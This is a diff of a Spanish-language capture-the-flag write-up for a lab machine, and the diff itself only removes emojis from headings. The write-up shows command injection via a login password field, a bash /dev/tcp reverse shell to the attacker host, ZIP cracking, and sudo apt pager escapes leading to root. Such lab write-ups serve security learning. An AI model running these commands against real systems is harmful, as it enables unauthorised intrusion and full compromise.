@@ -1,13 +1,13 @@
 # Zapasguapas - Full Detailed Writeup
 
-## 🖥️ Entorno
+##  Entorno
 
 -   **Máquina atacante:** Kali Linux (10.0.50.4)
 -   **Máquina víctima:** Zapasguapas (10.0.50.43)
 
 ------------------------------------------------------------------------
 
-# 1️⃣ Enumeración Inicial
+# 1️ Enumeración Inicial
 
 ## Escaneo completo de puertos
 
@@ -24,7 +24,7 @@ Tenemos únicamente HTTP y SSH.
 
 ------------------------------------------------------------------------
 
-# 2️⃣ Enumeración Web
+# 2️ Enumeración Web
 
 ## Revisión manual
 
@@ -52,7 +52,7 @@ Directorios interesantes:
 
 ------------------------------------------------------------------------
 
-# 3️⃣ Análisis del Login
+# 3️ Análisis del Login
 
 Accedemos a `/login.html`.
 
@@ -74,7 +74,7 @@ Esto ya indica mala práctica.
 
 ------------------------------------------------------------------------
 
-## 🔎 Revisando el código fuente
+##  Revisando el código fuente
 
 Encontramos:
 
@@ -83,7 +83,7 @@ Encontramos:
 xhr.open("GET", "run_command.php?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password), true);
 ```
 
-⚠️ Comentario clave:
+ Comentario clave:
 
     // Ejecutar el comando proporcionado como contraseña
 
@@ -91,7 +91,7 @@ Esto es una pista directa de posible ejecución de comandos.
 
 ------------------------------------------------------------------------
 
-# 4️⃣ Confirmación de RCE
+# 4️ Confirmación de RCE
 
 Probamos en el campo password:
 
@@ -103,13 +103,13 @@ Resultado:
 
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-🔥 Tenemos ejecución remota de comandos como `www-data`.
+ Tenemos ejecución remota de comandos como `www-data`.
 
 El campo password NO es contraseña real, es un comando del sistema.
 
 ------------------------------------------------------------------------
 
-# 5️⃣ Enumeración como www-data
+# 5️ Enumeración como www-data
 
 ``` bash
 whoami
@@ -159,7 +159,7 @@ No explotable.
 
 ------------------------------------------------------------------------
 
-# 6️⃣ Reverse Shell
+# 6️ Reverse Shell
 
 Como es entorno CTF, lanzamos reverse shell para trabajar cómodamente.
 
@@ -175,7 +175,7 @@ En el campo password:
 bash -c 'bash -i >& /dev/tcp/10.0.50.4/4444 0>&1'
 ```
 
-🔥 Shell obtenida.
+ Shell obtenida.
 
 ------------------------------------------------------------------------
 
@@ -193,7 +193,7 @@ Shell completamente funcional.
 
 ------------------------------------------------------------------------
 
-# 7️⃣ Enumeración Local Post-Explotación
+# 7️ Enumeración Local Post-Explotación
 
 En `/home`:
 
@@ -214,7 +214,7 @@ Contenido nota:
 
 ------------------------------------------------------------------------
 
-## 📦 Archivo interesante
+##  Archivo interesante
 
 En `/opt` encontramos:
 
@@ -224,7 +224,7 @@ Tenemos permisos de lectura.
 
 ------------------------------------------------------------------------
 
-# 8️⃣ Crackeo del ZIP
+# 8️ Crackeo del ZIP
 
 Copiamos a `/tmp`:
 
@@ -269,7 +269,7 @@ Resultado:
 
 ------------------------------------------------------------------------
 
-# 9️⃣ Escalada a pronike
+# 9️ Escalada a pronike
 
 ``` bash
 ssh pronike@10.0.50.43
@@ -284,7 +284,7 @@ ssh pronike@10.0.50.43
 
 ------------------------------------------------------------------------
 
-# 🔟 Escalada a proadidas
+#  Escalada a proadidas
 
 Según GTFOBins, `apt` es explotable usando paginador.
 
@@ -296,11 +296,11 @@ Dentro del paginador:
 
     !/bin/bash
 
-🔥 Ahora somos proadidas.
+ Ahora somos proadidas.
 
 ------------------------------------------------------------------------
 
-# 1️⃣1️⃣ Escalada Final a root
+# 1️1️ Escalada Final a root
 
 ``` bash
 sudo -l
@@ -320,11 +320,11 @@ Dentro del paginador:
 
     !/bin/bash
 
-🔥 Root obtenido.
+ Root obtenido.
 
 ------------------------------------------------------------------------
 
-# 🏁 Flags
+#  Flags
 
 ``` bash
 cat /home/proadidas/user.txt
@@ -333,7 +333,7 @@ cat /root/root.txt
 
 ------------------------------------------------------------------------
 
-# 🧠 Cadena Completa de Compromiso
+#  Cadena Completa de Compromiso
 
     RCE (www-data)
     → Reverse Shell
@@ -344,7 +344,7 @@ cat /root/root.txt
 
 ------------------------------------------------------------------------
 
-# 🎯 Técnicas utilizadas
+#  Técnicas utilizadas
 
 -   RCE vía parámetro GET
 -   Reverse shell bash
@@ -355,4 +355,4 @@ cat /root/root.txt
 
 ------------------------------------------------------------------------
 
-Máquina comprometida completamente.
+
